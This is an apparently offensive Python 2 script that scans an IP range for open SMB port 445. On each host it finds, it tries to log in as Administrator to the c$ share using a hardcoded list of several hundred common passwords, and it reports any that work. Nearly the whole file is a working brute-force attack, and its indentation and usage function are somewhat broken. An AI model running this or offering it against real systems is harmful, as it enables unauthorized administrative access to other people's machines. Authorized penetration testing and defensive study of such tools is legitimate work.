#!/usr/bin/env python
#
# Copyright (C) 2016 David Evenden (@jedimammoth)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#


import netaddr, smbclient, socket, sys, os, ipaddress, getopt
from multiprocessing import Pool

def usage():
  "%s -t 10.10.10.100" % sys.argv[0]
	"%s -t 10.10.10.0/24" % sys.argv[0]
	sys.exit(2)

def authenticate(ip,passwords):
	print 'Checking Authentication'
    	for cpass in passwords:
			try:
				print 'checking authentication'
				smb = smbclient.SambaClient(server=ip, share='c$', username='Administrator', password=cpass)
				a = smb.listdir("/")
				print "Sucessfully Authenticated with: Administrator\%s against %s" % (cpass, ip)
				break
			except Exception as e:
				error_string = str(e)
				if "NT_STATUS_ACCESS_DENIED" in error_string:
					print "NT_STATUS_ACCESS_DENIED"
					pass
				else:
					pass
	return()

def filter_ips(ip):
	ip = str(ip)
	#print 'testing ip %s:%s' % (ip, port)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(5)
  	result = sock.connect_ex((ip,port))
	if result == 111:
		print '%s connection refused' % ip
	if result == 113:
		pass
  	if result == 0:
		print '%s:%s open' % (ip, port)
		authenticate(ip,passwords)
	else:
		#print 'does not appear to be open'
		sock.close()
    	pass
	return()

def process_scans(target,port,passwords):
	target = (u'%s') % target
	ip_net = ipaddress.ip_network(target)
	print ip_net
	all_hosts = list(ip_net.hosts())
	if not all_hosts:
		ip = ipaddress.ip_address(target)
		filter_ips(ip)
	else:
		p = Pool(5)
		p.map(filter_ips, all_hosts)

target = 0
port = int(445)
passwords = ["admin@123","Admin@123","123@admin","Adm!n@321","Passw0rd123","Password3","Passw0rd505","Passw0rd090","Mpassw0rd2015","P@ssw0rd","password","P@ssw0rd321","P@ssw0rd123","P@ssw0000rd","Passw0rd","!QAZxsw2","Password123","Password5","Password37","Passw0rd626","Passw0rd1204","Passw0rd4249","Passw0rd331","Passw00rd","Passw0rd246","Passw0rd120","Passw0rd996","Passw0rd101","Passw0rd234","Passw0rd11","Passw2rd","Passw0rd1","Passw0rd5545","password2*","passPC123","pass@1234567","pass@123","p@ssword1","P@ssw0rd!5","Password@66","Password@22","P@ssw0rd@ir","newpass1","Passw1rd","Passw3rd","Passw0rd60695","EasyPassword1","p@ssword1290","Passw0rd014","Passw0rd106","P@ssw0rd!1","P@ssw0rd1","Newpassword2015","Passw0rd889","Passw0rd271","P@ssw0rd@123","P@ssw0rd2013","Passport@14","P@ssw0rd!8","Password@44","P@ssw0rd2015","password27","Passw0rdm","Password1","Pass12345","Pass123456","Password12345","P@ssw2rd","pass@12345678","password@2015","Password1234","Mpassw0rd2016","Password38","password3*","1qaz2wsx#edc","123p@ssw0rd","Password2012","P@ssw0rd88","Knewpass4","Password4","noP@ssw0rd123","14thPassword","IRPassw0rd","Password-93","Passw0rd1994","Passw0rd614","Passw0rd999","P@ssw0rddd","P@ssw0rd0","P@ssw0rd2014","Passw0rd10","OldPassword","pass@word4","Password1727","p@ssw0rddec","P@ssword153","EasyPassword2","Mpassw0rd2030","adminPassw0rd","Password@123","Password@2","P@ssword12","1qazZAQ!","tsP@ssw0rd","Password@098","pass123$","P@ssw0rd2","Passw0rd#","mohmeP@ssw0rd","Password@124","Password@3902","Password014","Passw0rd147","Passw0rd12","Passw0rd052","Passw0rd9977","Passw0rld18","Passw0rd616","Passw0rd121","Password2007","Passw0rd963","Passw0rd1200","Passw0rd222","Passw0rd789","Passw0rd9509","Passw0rd3010","Passw0rd421","Passw0rd760","Passw0rd195","Passw0rd923","Passw0rd901","P@ssw0rd176","pass@987","passapr123","Password@888","Password@25","Password69","Passw0rd112","Passw0rd008","P@ssw0rd@2015","Passw0rd248","Passw0rd555","Password1639","Passw0rd93","Passw0rd25","Passw0rd66866","Passw0rd12044","Passw0rd196","Passw0rd111","Password644","Passw0rd2","P@ssw0rd2024","P@ssw0rd1234","P@ssw00000rd","Password@33","P@ssw0rd123!","ucP@ssw0rd","Passw0rd197","Passw0rd381","Passw0rd009","Pass@12345","mokaP@ssw0rd","Password10","P@ssw0rd2022","password63","Passw0rd129","Passw0rd2400","dontaskmypassword","Password-94","Password@77","P@ssw0rd123456","P@ssw0rd!6","password48","password16","password06","password25","Password@1","P@ssword123","password62","P@ssw1rd","2015password","P@ssw0rd786","P@ssw0rd2023","Password@10","Passport@123","Password@4321","Password@0673","P@ssw0rd1970","Password@12345","P@ssword333","Pass1234!","pass.pass1","NewPassword","strongPassword5","password66","password52","$$P@ssw0rd@123$$","password2015","P@ssw0rd2211","P@ssw0rd!7","HATEpass1","Password03","Passw5rd","Password12","Passw0rda","password@2016","pass@22007","Password39","password4*","Passw0rd60696","Password11","15thPassword","pass@word1!","Password-95","1qazXSW@","4321Pass","Password909","Passw0rdk0$$","p@ssw0rdfeb","EasyPassword3","!qaz2wsx","P@ssword27","P@ssw0rd2212","Password010","KP@ssw0rd","Password123!","Password0014","Passw0rd302","Passw0rd258","Passw0rd23","Passw0rd929","Passw0rd18@","Passw4rd","Passw0rd1996","Passw0rdmay","Passw0rd141","Password2009","Passw0rd159","Passw0rd100","Passw0rd12000","Passw0rd113","Passw0rd137","Passw0rd12345","Passw0rd224","Passw0rd950920","Passw0rd1234","Passw0rd2905","Passw0rd423","Passw0rd345","Passw0rd321","Passw0rd164","Passw0rd727","Passw0rd1995","Passw0rd695","Passw0rd9011","Pass1234","pass@1234","pass@789","Password96","Passw0rd1120","Passw0rd252","Passw0rd206","Passw0rd242","Passw0rd267","Password16391","Passw0rd260","Passw0rd07","Passw0rd1993","Passw0rd273","Passw0rd66866567","Passw0rd518","Passw0rd120444","Passw0rd056","Password444","Password626","Passw0rd037","Passw0rd0","Passw0rd966","Passw0rd1501","Password@12","Password@321","P@ssw0rd1234qwer","Passwordabc123","PPPassword3","testP@ssw0rd","P@ssw0rd.1234!","123@P@ssw0rd","P@ssw0rd1107","0P@ssw0rd0","NewPassword123","pass@word5","P@ssword09","Password@3","password20","passmay123","Password@20","P@ssw0rd2025","password08","simplepassword2015","1qazxsw2","password04","passover15","password64","password50","password28","password07","passion1234","password49","Password3647","password123@","password@@@111","Password@55","Password@88","P@ssw0rd!10","Pass@123456","P@ssw0rd123$%","P@ssw0rd2020","password51","password65","P@ssw0rd1977","password22","password123.","password09","12345","1234546","1234567","12345678","123456789","1234567890","P@ssw0rd2026","P@ssw0rd@@2015","Password@18","Passjuly2015","password30","password2","Password@345","Password@5","P@ssw0rd$@","pass@word1","Password@1234","P@ssword99","password7","P@ssw0rd2012","pass@word6","P@ssw0rd05","P@ssw0rd00","P@ssw0rd1*","pass12$word","Passw0rd!","P@ssword63","P@ssw0rdd","Password-1","P@ssw0rd04","password2016","1975P@ssw0rd","Password@234","password31","pass@word2","password8","pass@word7","P@ssw0rd2*","password67","pass12$word1","P@ssword171","Qwerty1324","12#$QWer","Qwert123","12345Qwert","QwErTy123@","qwerty123","qwerasdf","!qwer789","qwert@12345","Qwerty132456","2@qwertyui","QWERTY@123","Qwer1234","4rfv5tgb^YHN","!Qwerty67","QWErt12345","QWErty12","WERErqwer1","Qwertyu1","Qwer!234","qwer567*","qwertymail05","Qwertyui2","Qwerty4g","QWert0yu","Qwert54321","Qwerty@1996","qwertr123!@#","qwerty@newmedia11","qwertyuiop#28","qwertyuio","qwert@123","qwerty@12345","3@qwertyui","qwergh@3","Qwertylol123","qwerty12#","Qwer9999","qwerty@newmedia12","123456Qwerty","qwEr1@34","Qwerty123*","Qwertyuiop2","Qwerty1234","Qwerty3g","Qwert_99","Qwerty01","Qwerty02","qwertyuiop","Qwert1234","QWERasdf1234","1234qwerASDF","qwerty12345","qwer@123","Qwerty#28","qwerfdsa"]



try:
    opts, args = getopt.getopt(sys.argv[1:], 't:h', ['target=', 'help'])
except getopt.GetoptError:
    usage()
    sys.exit(2)

for opt, arg in opts:
    if opt in ('-h', '--help'):
        usage()
        sys.exit(2)
    elif opt in ('-t', '--target'):
        target = arg
    else:
        usage()
        sys.exit(2)

process_scans(target,port,passwords)
